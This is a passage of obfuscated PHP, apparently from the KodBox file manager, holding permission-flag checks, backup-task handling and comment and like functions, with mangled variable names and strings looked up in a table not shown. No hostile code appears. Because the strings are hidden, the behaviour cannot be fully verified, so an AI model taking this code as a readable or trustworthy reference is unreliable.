{ } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($£ÅîııÊ) { if ($£ÅîııÊ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($‚¯ŞØ™ = "\160\x6c\165\x67\151\x6e\101\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $´âó«Ü˜ = $this->getConfig(); if (!$´âó«Ü˜[$‚¯ŞØ™]) { return !1; } return ActionCall($_SERVER[ç¦¬”œš][1689], $´âó«Ü˜[$‚¯ŞØ™]); } public function url($ÉÙ°ûşì, $¾†®Ú = '', $Æ³åÑ® = true) { $•¡Í©²™ =& $_SERVER[ç¦¬”œš]; $æÑÕ½éœ = $this->getConfig(); $—¨ÑÀõ‚ = KOD_VERSION . $•¡Í©²™[10] . KOD_VERSION_BUILD; $ØË¤”’® = $this->packageVersion(); $¹òÅİ³‡ = $—¨ÑÀõ‚ . $•¡Í©²™[462] . $ØË¤”’®; if (substr($ÉÙ°ûşì, 0, 4) == $•¡Í©²™[152] || substr($ÉÙ°ûşì, 0, 2) == $•¡Í©²™[1411]) { $¨à”Ó” = $ÉÙ°ûşì . $•¡Í©²™[1690] . $¹òÅİ³‡; } else { if ($¾†®Ú == $•¡Í©²™[12]) { $¨à”Ó” = $this->pluginHost . $ÉÙ°ûşì . $•¡Í©²™[1690] . $¹òÅİ³‡; } else { if ($¾†®Ú === $•¡Í©²™[78]) { $¨à”Ó” = $this->pluginHost . $ÉÙ°ûşì; } else { if ($¾†®Ú == $•¡Í©²™[1691]) { $¨à”Ó” = STATIC_PATH . $ÉÙ°ûşì . $•¡Í©²™[1690] . $—¨ÑÀõ‚; } else { if ($¾†®Ú == $•¡Í©²™[1692]) { $¨à”Ó” = APP_HOST . $•¡Í©²™[1693] . $ÉÙ°ûşì . $•¡Í©²™[1690] . $—¨ÑÀõ‚; } else { if (isset($æÑÕ½éœ[$¾†®Ú])) { $¨à”Ó” = $æÑÕ½éœ[$¾†®Ú] . $ÉÙ°ûşì . $•¡Í©²™[1690] . $¹òÅİ³‡; } } } } } } if (!$Æ³åÑ®) { return $¨à”Ó”; } echo $¨à”Ó”; } public function link($¢–Ûëà = false, $“¹ò„Ï = '') { $÷Ù·ÔÙå =& $_SERVER[ç¦¬”œš]; $’ú ó½À = $this->linkHas == !1; $this->linkHas = !0; if (!$¢–Ûëà) { $this->link($÷Ù·ÔÙå[1694], $÷Ù·ÔÙå[1692]); $this->link($÷Ù·ÔÙå[1695], $÷Ù·ÔÙå[1691]); $this->link($÷Ù·ÔÙå[1696], $÷Ù·ÔÙå[1691]); $this->link($÷Ù·ÔÙå[1697], $÷Ù·ÔÙå[1691]); $this->link($÷Ù·ÔÙå[1698], $÷Ù·ÔÙå[1691]); if ($’ú ó½À) { Hook::trigger($÷Ù·ÔÙå[1699]); } return; } $Ú›‰ÀÇÑ = $this->url($¢–Ûëà, $“¹ò„Ï, !1); if (substr($¢–Ûëà, -3) == $÷Ù·ÔÙå[1700]) { echo $÷Ù·ÔÙå[1701] . $Ú›‰ÀÇÑ . $÷Ù·ÔÙå[1702] . $÷Ù·ÔÙå[262]; } else { if (substr($¢–Ûëà, -4) == $÷Ù·ÔÙå[1703]) { echo $÷Ù·ÔÙå[1704] . $Ú›‰ÀÇÑ . $÷Ù·ÔÙå[1705] . $÷Ù·ÔÙå[262]; } } if ($’ú ó½À) { Hook::trigger($÷Ù·ÔÙå[1699]); } } } goto cÅ ¢¶Í¦Ê; fÖë£ç†©: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Å‚ËÕœ =& $_SERVER[ç¦¬”œš]; $ÖøÀ£†­ = array(array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1970]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1972], $Å‚ËÕœ[1973] => 1, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1976]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1977], $Å‚ËÕœ[1973] => 2, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1978]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1979], $Å‚ËÕœ[1973] => 3, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1980]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1981], $Å‚ËÕœ[1973] => 4, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => self::AUTH_SHOW | self::AUTH_VIEW), array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1982]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1983], $Å‚ËÕœ[1973] => 5, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1984]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1985], $Å‚ËÕœ[1973] => 6, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Å‚ËÕœ[503] => LNG($Å‚ËÕœ[1986]), $Å‚ËÕœ[1971] => $Å‚ËÕœ[1987], $Å‚ËÕœ[1973] => 7, $Å‚ËÕœ[1974] => 1, $Å‚ËÕœ[1975] => 0)); return $ÖøÀ£†­; } public static function authCheck($±Å÷íû, $”Í§…§É) { $Âúœ¬Ü =& $_SERVER[ç¦¬”œš]; $±Å÷íû = intval($±Å÷íû); if (KodUser::isRoot() && $GLOBALS[$Âúœ¬Ü[6]][$Âúœ¬Ü[1988]]) { return !0; } if ($±Å÷íû <= 0) { return !1; } if (($±Å÷íû & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($±Å÷íû & $”Í§…§É); } public static function authCheckShow($ßØ£Š»¿) { return self::authCheck($ßØ£Š»¿, self::AUTH_SHOW); } public static function authCheckView($Ñ””ÚÛ¹) { return self::authCheck($Ñ””ÚÛ¹, self::AUTH_VIEW); } public static function authCheckDownload($ÂÆŸú—â) { return self::authCheck($ÂÆŸú—â, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ƒÙìõõ–) { return self::authCheck($ƒÙìõõ–, self::AUTH_UPLOAD); } public static function authCheckEdit($¯¾“¥) { return self::authCheck($¯¾“¥, self::AUTH_EDIT); } public static function authCheckRemove($Ë½Ã›Ò€) { return self::authCheck($Ë½Ã›Ò€, self::AUTH_REMOVE); } public static function authCheckShare($­Ï„¶µÜ) { return self::authCheck($­Ï„¶µÜ, self::AUTH_SHARE); } public static function authCheckComment($ßéÉ ²Û) { return self::authCheck($ßéÉ ²Û, self::AUTH_COMMENT); } public static function authCheckEvent($ÌŞï×¼½) { return self::authCheck($ÌŞï×¼½, self::AUTH_EVENT); } public static function authCheckRoot($÷î°ª”Û) { return self::authCheck($÷î°ª”Û, self::AUTH_ROOT); } public static function authCheckAction($ï°ãî¦º, $²ôóË¥š) { $èÍõÅãÅ =& $_SERVER[ç¦¬”œš]; $Å«ä‡Û“ = array($èÍõÅãÅ[1989] => self::AUTH_VIEW, $èÍõÅãÅ[1280] => self::AUTH_DOWNLOAD, $èÍõÅãÅ[110] => self::AUTH_UPLOAD, $èÍõÅãÅ[1938] => self::AUTH_EDIT, $èÍõÅãÅ[1937] => self::AUTH_REMOVE, $èÍõÅãÅ[1948] => self::AUTH_SHARE, $èÍõÅãÅ[430] => self::AUTH_COMMENT, $èÍõÅãÅ[1758] => self::AUTH_EVENT, $èÍõÅãÅ[1990] => self::AUTH_ROOT); if (!isset($Å«ä‡Û“[$²ôóË¥š])) { return; } $÷¹¡š‘¦ = $Å«ä‡Û“[$²ôóË¥š]; $ï°ãî¦º = intval($ï°ãî¦º); if ($ï°ãî¦º <= 0) { return !1; } if (($ï°ãî¦º & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ï°ãî¦º & $÷¹¡š‘¦); } public static function authDisable($ë°Ù‚ŞÂ, $à·÷ÏşÁ) { if (intval($ë°Ù‚ŞÂ) <= 0) { return 0; } return intval($ë°Ù‚ŞÂ) & ~$à·÷ÏşÁ; } public $optionType = "\x53\x79\x73\164\145\x6d\x2e\x73\157\165\x72\x63\x65\101\x75\x74\x68\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\141\x75\164\150", "\154\141\x62\x65\154", "\x64\x69\x73\160\x6c\141\x79", "\163\x79\x73\x74\145\155", "\x73\157\x72\x74"); public function initData() { $¥³ÌèÉ = $this->authDefault(); foreach ($¥³ÌèÉ as $ªúäÄª‚) { $this->add($ªúäÄª‚); } } public function findAuth($ŠÄ×•üå, $ÓÂùïéË) { $¾‚…¤Ÿ± =& $_SERVER[ç¦¬”œš]; $ñÓ¶À­â = parent::listData(); foreach ($ñÓ¶À­â as $ƒÇù†Îö) { $Õèãùƒ¶ = intval($ƒÇù†Îö[$¾‚…¤Ÿ±[496]]); if ($Õèãùƒ¶ <= 0 || $ƒÇù†Îö[$¾‚…¤Ÿ±[1991]] == 0) { continue; } if (($Õèãùƒ¶ & $ŠÄ×•üå) != $ŠÄ×•üå) { continue; } if (($Õèãùƒ¶ & $ÓÂùïéË) != 0) { continue; } return $ƒÇù†Îö[$¾‚…¤Ÿ±[484]]; } return !1; } public function findAuthReadOnly() { $£úù×›ó = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $«°Œ¢¢ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($£úù×›ó, $«°Œ¢¢); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $¡¥Ø“ì =& $_SERVER[ç¦¬”œš]; $„åş¿‘È = parent::listData(); $ûö³¹•ì = !1; foreach ($„åş¿‘È as $Ñ¥¦ş½š) { if ($Ñ¥¦ş½š[$¡¥Ø“ì[496]] <= 0 || $Ñ¥¦ş½š[$¡¥Ø“ì[1991]] == $¡¥Ø“ì[228]) { continue; } if (!$ûö³¹•ì) { $ûö³¹•ì = $Ñ¥¦ş½š; continue; } if ($ûö³¹•ì[$¡¥Ø“ì[496]] > $Ñ¥¦ş½š[$¡¥Ø“ì[496]]) { $ûö³¹•ì = $Ñ¥¦ş½š; } } return $ûö³¹•ì ? $ûö³¹•ì[$¡¥Ø“ì[484]] : $¡¥Ø“ì[12]; } public function listData($¬ÔıÒ€÷ = false, $ø¾ş˜Ó‘ = "\x73\157\162\164", $¥¹ûƒ× = false) { return parent::listData($¬ÔıÒ€÷, $ø¾ş˜Ó‘, $¥¹ûƒ×); } public function update($–š‘³¡, $ÈÛÈ¢ÛÀ) { $ğ®öäàç =& $_SERVER[ç¦¬”œš]; $¢ú¨Ü²Ò = parent::listData($–š‘³¡); $¨ïÓºíŠ = $this->findByName($ÈÛÈ¢ÛÀ[$ğ®öäàç[32]]); if (!$¢ú¨Ü²Ò || $¨ïÓºíŠ && $¨ïÓºíŠ[$ğ®öäàç[484]] != $¢ú¨Ü²Ò[$ğ®öäàç[484]]) { return !1; } $this->filterAuth($ÈÛÈ¢ÛÀ[$ğ®öäàç[496]]); return parent::update($–š‘³¡, $ÈÛÈ¢ÛÀ); } public function remove($ñÚ¾ÙÓ§) { $ÀÈìã‘ = parent::listData($ñÚ¾ÙÓ§); if (!$ÀÈìã‘ || $ÀÈìã‘[$_SERVER[ç¦¬”œš][191]]) { return !1; } return parent::remove($ñÚ¾ÙÓ§); } public function add($Şš‘‘öœ = array()) { $–øº¼¤Ã =& $_SERVER[ç¦¬”œš]; if ($this->findByName($Şš‘‘öœ[$–øº¼¤Ã[32]])) { return !1; } $¼´ Ò = array($–øº¼¤Ã[32] => $–øº¼¤Ã[12], $–øº¼¤Ã[496] => 1, $–øº¼¤Ã[1992] => $–øº¼¤Ã[1979], $–øº¼¤Ã[1991] => 1, $–øº¼¤Ã[191] => 0, $–øº¼¤Ã[1993] => 0); $Şš‘‘öœ = array_merge($¼´ Ò, $Şš‘‘öœ); $Şš‘‘öœ[$–øº¼¤Ã[1993]] = $this->getSort(); $this->filterAuth($Şš‘‘öœ[$–øº¼¤Ã[496]]); return parent::insert($Şš‘‘öœ); } private function getSort() { $§•ÌÍ×ò =& $_SERVER[ç¦¬”œš]; $õö·¡í = parent::listData(); $Ã®…˜“¨ = array_to_keyvalue($õö·¡í, $§•ÌÍ×ò[12], $§•ÌÍ×ò[1993]); return empty($Ã®…˜“¨) ? 0 : max($Ã®…˜“¨) + 1; } private function filterAuth(&$¬ê‚†) { if (!$¬ê‚†) { return; } $¢äÈ”‘ˆ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ïŠàÈÚ° = array(); foreach ($¢äÈ”‘ˆ as $°ğúÙ¬´) { if ($¬ê‚† & $°ğúÙ¬´) { $ïŠàÈÚ°[] = $°ğúÙ¬´; } } if (in_array(self::AUTH_ROOT, $ïŠàÈÚ°)) { $¬ê‚† = array_sum($¢äÈ”‘ˆ); return; } $‡Æ¦úÛÛ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ïŠàÈÚ° as $°ğúÙ¬´) { if (isset($‡Æ¦úÛÛ[$°ğúÙ¬´])) { $ïŠàÈÚ° = array_merge($ïŠàÈÚ°, $‡Æ¦úÛÛ[$°ğúÙ¬´]); } } $ïŠàÈÚ°[] = self::AUTH_SHOW; $¬ê‚† = array_sum(array_unique($ïŠàÈÚ°)); } public function sort($ãß¬ÌÅ, $òª›—ª) { return parent::update($ãß¬ÌÅ, $òª›—ª); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x62\141\143\153\x75\x70\114\x69\163\164"; public $field = array("\151\x6f", "\x6e\x61\x6d\x65", "\x73\164\141\x74\x75\163", "\x63\x6f\x6e\164\x65\x6e\x74", "\x6d\x61\x6e\165\x61\154", "\x72\x65\163\165\x6c\164", "\164\151\x6d\145\x46\x72\157\x6d", "\x74\151\x6d\x65\124\x6f"); public function config() { $Áïúí¿ =& $_SERVER[ç¦¬”œš]; Action($Áïúí¿[1994])->taskInit(); $è†Óë°Í = Model($Áïúí¿[850])->get($Áïúí¿[863]); $è†Óë°Í = json_decode($è†Óë°Í, !0); $è†Óë°Í = is_array($è†Óë°Í) ? $è†Óë°Í : array(); $this->parseContent($è†Óë°Í); unset($è†Óë°Í[$Áïúí¿[1740]]); Model($Áïúí¿[1739])->cacheClear(); $×éŞÑ¢¹ = $Áïúí¿[1995]; $·®¡Ô¸š = Model($Áïúí¿[1996])->findByKey($Áïúí¿[1758], $×éŞÑ¢¹); if (!$·®¡Ô¸š) { $·®¡Ô¸š = array(); } if (isset($·®¡Ô¸š[$Áïúí¿[206]])) { $·®¡Ô¸š[$Áïúí¿[206]] = json_decode($·®¡Ô¸š[$Áïúí¿[206]], !0); } if (isset($è†Óë°Í[$Áïúí¿[206]])) { $·®¡Ô¸š[$Áïúí¿[206]][$Áïúí¿[1743]] = $è†Óë°Í[$Áïúí¿[206]]; unset($è†Óë°Í[$Áïúí¿[206]]); } return array_merge($·®¡Ô¸š, $è†Óë°Í); } public function listData($öÖí’ÔÁ = false, $…ÂÙä = "\155\x6f\x64\x69\x66\171\124\x69\x6d\x65", $ï…Ê‡†® = false) { $ğ¾–Òøó = parent::listData($öÖí’ÔÁ, $…ÂÙä, !0); if (!$ğ¾–Òøó) { return $ğ¾–Òøó; } if ($öÖí’ÔÁ) { $ğ¾–Òøó = array($ğ¾–Òøó); } foreach ($ğ¾–Òøó as &$şã½–¨) { $this->parseContent($şã½–¨); } return $öÖí’ÔÁ ? $ğ¾–Òøó[0] : $ğ¾–Òøó; } public function parseContent(&$á Ñ¸Ú…) { $ŒÚÁ‡Åí =& $_SERVER[ç¦¬”œš]; $Õ¤Ì’§ = _get($á Ñ¸Ú…, $ŒÚÁ‡Åí[171], $ŒÚÁ‡Åí[91]); if (!in_array($Õ¤Ì’§, array($ŒÚÁ‡Åí[856], $ŒÚÁ‡Åí[1212]))) { $á Ñ¸Ú…[$ŒÚÁ‡Åí[171]] = $Õ¤Ì’§ == $ŒÚÁ‡Åí[91] ? $ŒÚÁ‡Åí[1212] : $ŒÚÁ‡Åí[856]; } } public function lastItem() { $Íñì¿âÁ = $this->listData(); return !empty($Íñì¿âÁ[0]) ? $Íñì¿âÁ[0] : null; } public function kill($ÎŞê¬ü) { $³şàúÓ =& $_SERVER[ç¦¬”œš]; $³à†«‹É = $this->listData($ÎŞê¬ü); if (!$³à†«‹É || empty($³à†«‹É[$³şàúÓ[32]])) { return !0; } Task::kill($³şàúÓ[862]); Task::kill($³şàúÓ[880]); Task::kill($³şàúÓ[889]); $ê†ËÁç° = $³à†«‹É[$³şàúÓ[32]]; $‚¸çç˜– = TEMP_FILES . $³şàúÓ[859] . $ê†ËÁç° . $³şàúÓ[8]; IO::remove($‚¸çç˜–, !1); return $this->remove($ÎŞê¬ü); } public function remove($Âò±·âş) { $Ù‡ÛÂ ô = $this->listData($Âò±·âş); if (!$Ù‡ÛÂ ô) { return !0; } return $this->backupRemove($Ù‡ÛÂ ô); } private function backupRemove($©”îé†) { parent::remove($©”îé†[$_SERVER[ç¦¬”œš][484]]); $£Œíõ¶ = $this->backupPath($©”îé†); IO::remove($£Œíõ¶, !1); return !0; } private function backupPath($ü‹±€Ìä) { $‡¶„Åºó =& $_SERVER[ç¦¬”œš]; $à£ô„Î¥ = $ü‹±€Ìä[$‡¶„Åºó[32]]; $½×´Í = Model($‡¶„Åºó[850])->get($‡¶„Åºó[851]); $¨¶øØ²¿ = substr(md5($‡¶„Åºó[852] . $½×´Í . $à£ô„Î¥), 0, 8); return "\x7b\151\x6f\x3a{$ü‹±€Ìä[$‡¶„Åºó[832]]}\x7d\x2f\144\x61\164\x61\x62\141\163\145\x2f\142\141\143\153\x75\160\57" . $à£ô„Î¥ . $‡¶„Åºó[11] . $¨¶øØ²¿; } public function start() { $Ò›ä™»É =& $_SERVER[ç¦¬”œš]; if ($GLOBALS[$Ò›ä™»É[6]][$Ò›ä™»É[92]][$Ò›ä™»É[1997]] != $Ò›ä™»É[91]) { return !0; } $Ÿ‡ëÆ‹¶ = $this->config(); if (!$Ÿ‡ëÆ‹¶ || $Ÿ‡ëÆ‹¶[$Ò›ä™»É[1740]] != $Ò›ä™»É[91]) { return !1; } if ($Ÿ‡ëÆ‹¶[$Ò›ä™»É[171]] == $Ò›ä™»É[856]) { $¬ù”¾Êˆ = Model($Ò›ä™»É[850])->get($Ò›ä™»É[1325]); if ($¬ù”¾Êˆ == $Ò›ä™»É[1326]) { $Ÿ‡ëÆ‹¶[$Ò›ä™»É[171]] = $Ò›ä™»É[1212]; } } $Ü™‚”Ò = $this->process(); foreach ($Ü™‚”Ò as $Ğä…ÖÆä) { if ($Ğä…ÖÆä) { return Task::restart($Ğä…ÖÆä[$Ò›ä™»É[484]]); } } $ÌŒ‰İÒê = new Backup(); $Ï›íï¹œ = $ÌŒ‰İÒê->db(); if ($Ï›íï¹œ) { $Ï›íï¹œ = $ÌŒ‰İÒê->dbFile(); if ($Ï›íï¹œ && $Ÿ‡ëÆ‹¶[$Ò›ä™»É[171]] == $Ò›ä™»É[856]) { $Ï›íï¹œ = $ÌŒ‰İÒê->file(); } } Backup::set(array($Ò›ä™»É[830] => 1, $Ò›ä™»É[841] => time())); return !0; } public function process() { $ÃŸõÓù¨ =& $_SERVER[ç¦¬”œš]; $Áë¡ù = array($ÃŸõÓù¨[837] => Task::get($ÃŸõÓù¨[862]), $ÃŸõÓù¨[842] => Task::get($ÃŸõÓù¨[880]), $ÃŸõÓù¨[230] => Task::get($ÃŸõÓù¨[889])); $£À×–ÀÉ = !1; foreach ($Áë¡ù as &$¨ôíñ¿–) { if ($£À×–ÀÉ) { $¨ôíñ¿– = !1; continue; } if ($¨ôíñ¿–) { $Ì¢‹‡²Œ = intval(_get($¨ôíñ¿–, $ÃŸõÓù¨[1775], 0)); if (time() - $Ì¢‹‡²Œ > 7200) { Task::kill($¨ôíñ¿–[$ÃŸõÓù¨[484]]); $£À×–ÀÉ = !0; $¨ôíñ¿– = !1; } } } return $Áë¡ù; } public function restore() { $¦ûíâĞº =& $_SERVER[ç¦¬”œš]; ActionCall($¦ûíâĞº[1139], !0, 1); ActionCall($¦ûíâĞº[1139], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\155\x65" => "\143\x6f\155\x6d\x65\156\x74\x5f\155\x65\x74\141", "\155\x65\164\x61\106\151\145\x6c\x64" => "\x63\157\155\x6d\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ïä—ŞÏ«) { $Ãû¦Ã¬ã =& $_SERVER[ç¦¬”œš]; if ($Ïä—ŞÏ«[$Ãû¦Ã¬ã[1998]]) { $¥ŞÖ«°‹ = $this->where(array($Ãû¦Ã¬ã[1999] => $Ïä—ŞÏ«[$Ãû¦Ã¬ã[1998]]))->find(); if (!$¥ŞÖ«°‹ || $¥ŞÖ«°‹[$Ãû¦Ã¬ã[190]] != $Ïä—ŞÏ«[$Ãû¦Ã¬ã[190]] || $¥ŞÖ«°‹[$Ãû¦Ã¬ã[578]] != $Ïä—ŞÏ«[$Ãû¦Ã¬ã[578]]) { return !1; } $this->where(array($Ãû¦Ã¬ã[1999] => $Ïä—ŞÏ«[$Ãû¦Ã¬ã[1998]]))->setAdd($Ãû¦Ã¬ã[2000], 1); } $Ïä—ŞÏ«[$Ãû¦Ã¬ã[2001]] = 0; $Ïä—ŞÏ«[$Ãû¦Ã¬ã[2000]] = 0; $Ïä—ŞÏ«[$Ãû¦Ã¬ã[830]] = 1; return $this->add($Ïä—ŞÏ«); } public function commentCount($şÀ¹˜«´, $®ÏäÙâµ, $ÄÄ¼ã² = false) { $èş’‰ÁŸ =& $_SERVER[ç¦¬”œš]; if (!$şÀ¹˜«´) { return array(); } if (is_string($şÀ¹˜«´) || is_int($şÀ¹˜«´)) { $şÀ¹˜«´ = array($şÀ¹˜«´); } $ññ’­ˆº = array($èş’‰ÁŸ[578], $èş’‰ÁŸ[2002] => $èş’‰ÁŸ[574]); $»…ğ¸ï = array($èş’‰ÁŸ[578] => array($èş’‰ÁŸ[7], $şÀ¹˜«´), $èş’‰ÁŸ[190] => $®ÏäÙâµ); if ($ÄÄ¼ã²) { $»…ğ¸ï[$èş’‰ÁŸ[1770]] = $ÄÄ¼ã²; } $Ã§¸à÷¿ = $this->field($ññ’­ˆº)->where($»…ğ¸ï)->group($èş’‰ÁŸ[578])->select(); return array_to_keyvalue($Ã§¸à÷¿, $èş’‰ÁŸ[578], $èş’‰ÁŸ[574]); } public function starTarget($§­ÓÀéÔ, $Ş‚–¤©) { $ƒíİùğ‡ =& $_SERVER[ç¦¬”œš]; $¾ˆ¿Şı = $§­ÓÀéÔ + self::TYPE_STAR_OFFSET; $¥ºÔ®‡ı = array($ƒíİùğ‡[1770] => USER_ID, $ƒíİùğ‡[190] => $¾ˆ¿Şı, $ƒíİùğ‡[578] => $Ş‚–¤©); $¸¹¥áü = $this->where($¥ºÔ®‡ı)->find(); if ($¸¹¥áü) { return $this->where(array($ƒíİùğ‡[484] => $¸¹¥áü[$ƒíİùğ‡[484]]))->delete(); } $ÅÀãÄë© = array($ƒíİùğ‡[1998] => 0, $ƒíİùğ‡[1770] => USER_ID, $ƒíİùğ‡[830] => 1, $ƒíİùğ‡[171] => $ƒíİùğ‡[12], $ƒíİùğ‡[190] => $¾ˆ¿Şı, $ƒíİùğ‡[578] => $Ş‚–¤©, $ƒíİùğ‡[2001] => 0, $ƒíİùğ‡[2000] => 0); return $this->add($ÅÀãÄë©); } public function starTargetCount($‚¯é‡ş¾, $ÊÒüüÛâ) { $…¤ïÉ§ =& $_SERVER[ç¦¬”œš]; $¬ØÆüÕ¡ = $ÊÒüüÛâ + self::TYPE_STAR_OFFSET; $³¼ıÈê‚ = $this->commentCount($‚¯é‡ş¾, $¬ØÆüÕ¡); $š¡™ùÎ¯ = $this->commentCount($‚¯é‡ş¾, $¬ØÆüÕ¡, USER_ID); return array($…¤ïÉ§[2003] => $³¼ıÈê‚, $…¤ïÉ§[2004] => $š¡™ùÎ¯); } public function starTargetUserList($ŠÇĞÄ€, $şÃ®Åç) { $œ³Ø÷ô¨ =& $_SERVER[ç¦¬”œš]; $úò¹†´ = $ŠÇĞÄ€ + self::TYPE_STAR_OFFSET; $‡»Úßä§ = array($œ³Ø÷ô¨[578] => $şÃ®Åç, $œ³Ø÷ô¨[190] => $úò¹†´); $ñ­ÎÆ¸Æ = $this->where($‡»Úßä§)->count(); $š÷ì›ıç = array($œ³Ø÷ô¨[332] => $ñ­ÎÆ¸Æ, $œ³Ø÷ô¨[2005] => array()); if (!$ñ­ÎÆ¸Æ) { return $š÷ì›ıç; } $¸Ë£ëË = $this->field($œ³Ø÷ô¨[1770])->where($‡»Úßä§)->limit(500)->select(); $¸Ë£ëË = array_to_keyvalue($¸Ë£ëË, $œ³Ø÷ô¨[12], $œ³Ø÷ô¨[1770]); $š÷ì›ıç[$œ³Ø÷ô¨[2005]] = Model($œ³Ø÷ô¨[586])->userListInfo($¸Ë£ëË); return $š÷ì›ıç; } public function prasiseUserList($‰Ğ•¨†) { $·ßûÏ¿Í =& $_SERVER[ç¦¬”œš]; $¤ĞÔ•ª­ = array($·ßûÏ¿Í[2006] => $‰Ğ•¨†); $ÇÈØİò° = $this->where($¤ĞÔ•ª­)->find(); $°®³Å¦™ = _get($ÇÈØİò°, $·ßûÏ¿Í[2001], 0); $Ç„¬à‡â = array($·ßûÏ¿Í[332] => $°®³Å¦™, $·ßûÏ¿Í[2005] => array()); if (!$°®³Å¦™) { return $Ç„¬à‡â; } $Ä€Òåê† = Model($·ßûÏ¿Í[2007])->field($·ßûÏ¿Í[1770])->where($¤ĞÔ•ª­)->limit(500)->select(); $Ä€Òåê† = array_to_keyvalue($Ä€Òåê†, $·ßûÏ¿Í[12], $·ßûÏ¿Í[1770]); $Ç„¬à‡â[$·ßûÏ¿Í[2005]] = Model($·ßûÏ¿Í[586])->userListInfo($Ä€Òåê†); return $Ç„¬à‡â; } public function remove($ö £•ª÷) { $Ï¡àØô =& $_SERVER[ç¦¬”œš]; $ºĞÛÍ¡ş = array($Ï¡àØô[1999] => $ö £•ª÷); $üºâõ±å = $this->where($ºĞÛÍ¡ş)->find(); if ($üºâõ±å[$Ï¡àØô[1998]]) { $this->where(array($Ï¡àØô[1999] => $üºâõ±å[$Ï¡àØô[1998]]))->setAdd($Ï¡àØô[2000], -1); } return $this->where($ºĞÛÍ¡ş)->delete(); } public function edit($æ¯ÅÂÍ, $ÁƒûÂğ¨) { $Æ¢šìÚ° =& $_SERVER[ç¦¬”œš]; $»€²ú¾ = array($Æ¢šìÚ°[1999] => $æ¯ÅÂÍ); return $this->where($»€²ú¾)->save(array($Æ¢šìÚ°[2008] => $ÁƒûÂğ¨)); } public function prasise($¢ûÅ±„ï) { $ŒùòÊ”Û =& $_SERVER[ç¦¬”œš]; $‰×ŒË¤ = Model($ŒùòÊ”Û[2009]); $± °ÙÓÄ = array($ŒùòÊ”Û[1999] => $¢ûÅ±„ï, $ŒùòÊ”Û[1761] => USER_ID); $·±…İâ  = $‰×ŒË¤->where($± °ÙÓÄ)->find(); if (!$·±…İâ ) { $‰×ŒË¤->add($± °ÙÓÄ); $ñùÕé¯ = $this->where(array($ŒùòÊ”Û[1999] => 